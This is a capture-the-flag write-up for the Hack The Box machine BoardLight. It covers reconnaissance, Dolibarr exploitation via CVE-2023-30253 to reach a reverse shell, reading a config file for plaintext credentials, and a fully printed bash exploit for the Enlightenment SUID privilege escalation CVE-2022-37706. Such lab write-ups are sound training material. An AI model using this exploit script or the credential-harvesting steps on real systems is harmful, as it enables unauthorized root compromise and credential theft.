---
layout: single
title: Boardlight - Hack The Box
excerpt: "BoardLight is an easy difficulty Linux machine that features a `Dolibarr` instance vulnerable to [CVE-2023-30253](https://nvd.nist.gov/vuln/detail/CVE-2023-30253). This vulnerability is leveraged to gain access as `www-data`. After enumerating and dumping the web configuration file contents, plaintext credentials lead to `SSH` access to the machine. Enumerating the system, a `SUID` binary related to `enlightenment` is identified which is vulnerable to privilege escalation via [CVE-2022-37706]( https://nvd.nist.gov/vuln/detail/CVE-2022-37706) and can be abused to leverage a root shell."
date: 2025-05-09
classes: wide
header:
  teaser: /img2/boardlight.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Easy
tags:
  - Subdomain Enumeration
  - Dolibarr 17.0.0 Exploitation - CVE-2023-30253
  - Information Leakage (User Pivoting)
  - Enlightenment SUID Binary Exploitation [Privilege Escalation]
---


## Reconnaissance

- Nmap

```bash
nmap -sS --open -p- --min-rate 5000 -vvv -Pn 10.10.11.11
```

- Add domain to local DNS

```bash
echo "10.10.11.11 board.htb" >> /etc/hosts
```

- Subdomain fuzzing with Gobuster

```bash
gobuster vhost -u http://board.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 20 --append-domain
```

![](/img2/Pasted%20image%2020250509120442.png)

- Add subdomain to local DNS

```bash
echo "10.10.11.11 crm.board.htb" >> /etc/hosts
```

## Exploitation

- Login with admin default password

![](/img2/Pasted%20image%2020250509120947.png)

- Test PHP bypass

![](/img2/Pasted%20image%2020250509123427.png)

![](/img2/Pasted%20image%2020250509123505.png)

- Send reverse shell

![](/img2/Pasted%20image%2020250509123836.png)

```bash
nc -nlvp 9000
```

## Post-exploitation

- Find conf files

```bash
find / -name \*conf\* 2>/dev/null | grep -vE "proc|sys|usr|etc|boot|lib|dpkg"
```

![](/img2/Pasted%20image%2020250509131617.png)

```bash
cat /var/www/html/crm.board.htb/htdocs/conf/conf.php
```

![](/img2/Pasted%20image%2020250509131928.png)

- Pivoting 

```bash
su larissa
```

- Find SUID 

```bash
find / -perm -4000 2>/dev/null
```

![](/img2/Pasted%20image%2020250509133609.png)

- Execute exploit

```bash
#!/bin/bash
echo "CVE-2022-37706"
echo "[*] Trying to find the vulnerable SUID file..."
echo "[*] This may take few seconds..."

file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
if [[ -z ${file} ]]
then
	echo "[-] Couldn't find the vulnerable SUID file..."
	echo "[*] Enlightenment should be installed on your system."
	exit 1
fi

echo "[+] Vulnerable SUID binary found!"
echo "[+] Trying to pop a root shell!"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Enjoy the root shell :)"
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
```

```bash
chmod +x exploit.sh
./exploit.sh
```

![](/img2/Pasted%20image%2020250509133735.png)

![](/img2/Pasted%20image%2020250509133437.png)

